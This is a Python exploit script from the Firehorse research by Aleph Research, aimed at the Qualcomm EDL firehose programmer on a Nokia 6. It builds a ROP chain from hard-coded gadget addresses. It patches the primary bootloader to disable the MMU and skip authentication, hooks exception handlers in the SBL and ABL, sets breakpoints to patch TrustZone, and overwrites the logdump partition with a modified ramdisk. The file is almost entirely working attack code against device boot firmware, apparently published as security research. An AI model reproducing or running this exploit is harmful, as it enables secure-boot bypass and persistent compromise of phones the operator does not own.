#
# firehrose
# By Roee Hay & Noam Hadad, Aleph Research
#

import argparse
import time
import re
import sys
import binascii
import subprocess
import os
import struct
import pt
import target
import constants
from log import *
from cmd import *
from fw import Framework as p
from fw import *
from fh import *
import target as t


GADGET_INFINITE_LOOP = 0x080115D9
GADGET_INVALID = 0x12345679
GADGET_BX_LR = 0x8010671

# FIRST GADGET
ORIGINAL_SAVED_LR = 0x0802049b
BASE = 0x804d000
SP0 = BASE+0xFFDC
FIRST_SAVED_LR = SP0

GADGET_ADD_SP_118 = 0x08025A8B
SP_INSIDE_FIRST_GADGET = FIRST_SAVED_LR+4+0x118
SP_POP_R4 = SP_INSIDE_FIRST_GADGET 
SP_INSIDE_FIRST_GADGET2 = SP_INSIDE_FIRST_GADGET+5*4
SP_AFTER_FIRST_GADGET = SP_INSIDE_FIRST_GADGET2+0x14

GADGET_FIRST_GADGET_CONTROL_PC = SP_INSIDE_FIRST_GADGET2

# PC <- [SP_AFTER_FIRST_GADGET]

SP1 = SP_AFTER_FIRST_GADGET

# GADGET CONTROL REGISTERS
GADGET_CONTROL_REGISTERS = 0x08008D38
SP_AFTER_GADGET_CONTROL_REGISTERS = SP1 + 40
GADGET_CONTROL_REGISTERS_CONTROL_R4 = SP1 
GADGET_CONTROL_REGISTERS_CONTROL_R12 = SP1+32
GADGET_CONTROL_REGISTERS_CONTROL_PC = SP1+36
# PC <- [SP1+36]

SP2 = SP_AFTER_GADGET_CONTROL_REGISTERS

# GADGET_BLX_R12
GADGET_BLX_R12 = 0x0801064B
GADGET_BLX_R12_CONTROL_R1 = SP2+4
SP_AFTER_GADGET_BLX_R12 = SP2+0xC+12
GADGET_BLX_R12_CONTROL_PC = SP_AFTER_GADGET_BLX_R12 - 4
GADGET_BLX_R12_CONTROL_R4 = SP_AFTER_GADGET_BLX_R12 - 12

SP3 = SP_AFTER_GADGET_BLX_R12
# PC <- [SP3-4] 

# GADGET_LEAK_PT
GADGET_LEAK_PT = 0x80081AC

# GADGET LEAK R0 TO [R4]
GADGET_LEAK_R0 = 0x800D037
SP_AFTER_GADGET_LEAK_R0 = SP3+0x14+12
SP4 = SP_AFTER_GADGET_LEAK_R0
GADGET_LEAK_R0_CONTROL_PC = SP4-4
# PC <- [SP4-4]

# PRINT GADGET
GADGET_PRINT = 0x08016333
SP_PRINTF_CANARY = 0x380
SP_PRINTF_CANARY2 = 0xD0
SP_AFTER_PRINTF_GADGET = 0x38c+36
# PC <- [SP_AFTER_PRINTF_GADGET-4]


def rop_exec(va, r4):
    Framework.copy(SP4,FIRST_SAVED_LR+4, 64)
    Framework.poke(GADGET_LEAK_R0_CONTROL_PC, 4, ORIGINAL_SAVED_LR)
    Framework.poke(GADGET_BLX_R12_CONTROL_PC, 4, GADGET_LEAK_R0)
    #Framework.poke(GADGET_BLX_R12_CONTROL_R1, 4, 0x12345678)
    Framework.poke(GADGET_BLX_R12_CONTROL_R4, 4, r4)
    #Framework.poke(GADGET_CONTROL_REGISTERS_CONTROL_R4, 4, 0x12345678)
    Framework.poke(GADGET_CONTROL_REGISTERS_CONTROL_R12, 4, va)
    Framework.poke(GADGET_FIRST_GADGET_CONTROL_PC, 4, GADGET_CONTROL_REGISTERS)
    Framework.poke(GADGET_CONTROL_REGISTERS_CONTROL_PC, 4, GADGET_BLX_R12)
    Framework.poke(FIRST_SAVED_LR, 4, GADGET_ADD_SP_118)


def rop():
    rop_exec(GADGET_LEAK_PT, t.get().fh_base_programmer)


def eggsend(path, dst):
    e = Egg(file(path,"rb").read(), dst)
    e.send()


def apply_patches(m, target):
    cmd = Commands()
    m.patch(MODE_PBL, 0x103e8c, b"\x00\x50\x9F\xE5\x15\xFF\x2F\xE1\x00\x00\x0B\x08") # patch error handler
    m.patch32_pbl(0x110014, 0xE320F000) # disable MMU

    m.nop(MODE_PBL, 0x110678, 0x1107B8) # remove initialization of page tables
    m.patch32_pbl(0x1107B8, 0xE3A05000) # MOV R5, 0 - set return value to 0

    # change stack of aborts. MOV SP, 0x80CFFF0
    m.patch32_pbl(0x100298, 0xE30F0FF0) # MOV R0, 0xFFF0
    m.patch32_pbl(0x10029c, 0xE340080C)  # MOVT R0, 0x80C
    m.patch32_pbl(0x1002a0, 0xE1A0D000) # MOV SP, R0

    # set saved registers buffer
    m.patch32_pbl(0x100378, target.fh_base_programmer + target.fh_scratch_offset + 0x1008)

    # set ourselves as manager
    m.patch32_pbl(0x110008, 0xE3E00000)

    # pbl auth patch
    m.patch32_pbl(0x103478, 0xEA000004)
    
    # patch exception handlers in the programmer
    m.patch32_programmer(0x8008BCC, 0xE51FF004)
    m.patch32_programmer(0x8008BD0, target.addr_callback(cmd.DBG_INT))

    m.patch32_programmer(0x8008BD4, 0xE51FF004)
    m.patch32_programmer(0x8008BD8, target.addr_callback(cmd.DBG_INT))

    m.patch32_programmer(0x8008BDC, 0xE51FF004)
    m.patch32_programmer(0x8008BE0, target.addr_callback(cmd.DBG_INT))


    # SBL patcher - patch exception handlers in the SBL
    m.patch32_sbl(0x080225BC, 0xE51FF004)
    m.patch32_sbl(0x080225C0, target.addr_callback(cmd.DBG_SOFTWARE_ENTRY))

    m.patch32_sbl(0x80068AC, 0xE51FF004)
    m.patch32_sbl(0x80068B0, target.addr_callback(cmd.DBG_INT))

    m.patch32_sbl(0x80068B4, 0xE51FF004)
    m.patch32_sbl(0x80068B8, target.addr_callback(cmd.DBG_PREFETCH_ABORT_ENTRY))

    m.patch32_sbl(0x80068BC, 0xE51FF004)
    m.patch32_sbl(0x80068C0, target.addr_callback(cmd.DBG_DATA_ABORT_ENTRY))


    # ABL patcher - patch undef instruction handler in the ABL
    m.patch32_abl(0x8F6238AC, 0xE51FF004)
    m.patch32_abl(0x8F6238B0, target.addr_callback(cmd.DBG_SOFTWARE_ENTRY, target.fh_base_aboot))


def addr_callback(fh_base, n):
    return fh_base+0x20+n*4

def apply_breakpoints(m):
    cmd = Commands()

    m.break_function(MODE_PBL, "pbl_sense_jtag", flag=BP_FLAG_ONCE, cb=cmd.DISABLE_UART)
    m.break_function(MODE_PBL, "pbl_jmp_to_sbl", flag=BP_FLAG_ONCE, cb=cmd.CB_SBLPATCHER)
    m.bp_sbl(0x803D05E, size=2, msg="Patch TrustZone", cb=cmd.PATCH_TZ)
    m.bp_sbl(0x0803E220, size=2, msg="SBLEnd", cb=cmd.ABL_PATCHER)
    m.bp_abl(0x8F6178F8, msg="beforelinux", cb=cmd.BEFORE_LINUX)
    m.bp_abl(0x8F633754, msg="mmcread2", cb=cmd.MMC_READ)
    m.bp_abl(0x8F635078, msg="bootlinux", cb=cmd.BOOTLINUX)


def magic():
    cmd = Commands()
    target = t.get()

    # overwrite logdump partition with our modified ramdisk
    Framework.write_partition("logdump", "target/nokia6/nokia6-ramdisk-modified.cpio.gz")

    bbdb = BasicBlocks(target.basicblocks_db_pbl)
    bpm = BreakpointManager(bbdb)
    pm = PatchManager()

    I("applying patches and breakpoints...")
    apply_patches(pm, target)
    apply_breakpoints(bpm)

    I("creating pagecopy...")
    pages = set()
    pages.update(pm.get_pbl_page_numbers())
    pages.update(bpm.get_pbl_page_numbers())
    I("pages: " + str(pages))
    pc = PageCopy(MODE_PBL, target.pbl_base_addr, target.pbl_copy_addr, pages)

    I("uploading firehorse data...")
    fh = Firehorse(pm, bpm, pc)
    fhdata = fh.pack()
    fhbin = file("../tmp/fh.bin", "wb")
    fhbin.write(fhdata)
    fhbin.close()

    e = Egg(fhdata, target.fh_base_programmer+target.fh_scratch_offset)
    e.send()

    I("uploading firehorse...")
    e = Egg(file("../device/build/fh.payload","rb").read(), target.fh_base_programmer)
    e.send()

    I("initializing firehorse...")
    p.exe_cmd(target.fh_base_programmer, cmd.INIT)

    I("calling pbl patcher...")
    p.exe_cmd(target.fh_base_programmer, cmd.PBL_PATCHER)

    if "wait" in " ".join(sys.argv):
        I("waiting for LF")
        raw_input()
        I("you have 5 seconds")
        time.sleep(5)
    
    Framework.exe(target.pbl_base_addr)



t.add_target(name="nokia6", arch=32,
             programmer_path=r"target/nokia6/prog_emmc_firehose_8937_lite.mbn",
             peekpoke_style=0, saved_lr=0x0802049b, saved_lr_addr=0x805cfdc,
             pbl_base_addr=0x100000, pbl_copy_addr=0x8080000,
             page_table_base=0x200000,
             fh_base_programmer=0x80b0000, fh_base_aboot=0x8f900000,
             fh_scratch_offset=0x20000, fh_saved_regs_offset=0x21000,
             egghunter_found_parts=0x8093000,
             egghunter_base=0x080af000,
             egg_xml='target/nokia6/egg-nokia6.xml',
             basicblocks_db_pbl="target/nokia6/pbl-nokia6-bbdb.txt",
             magic=magic,
             rawprogram_xml="target/nokia6/rawprogram0.xml",
             rop=rop)
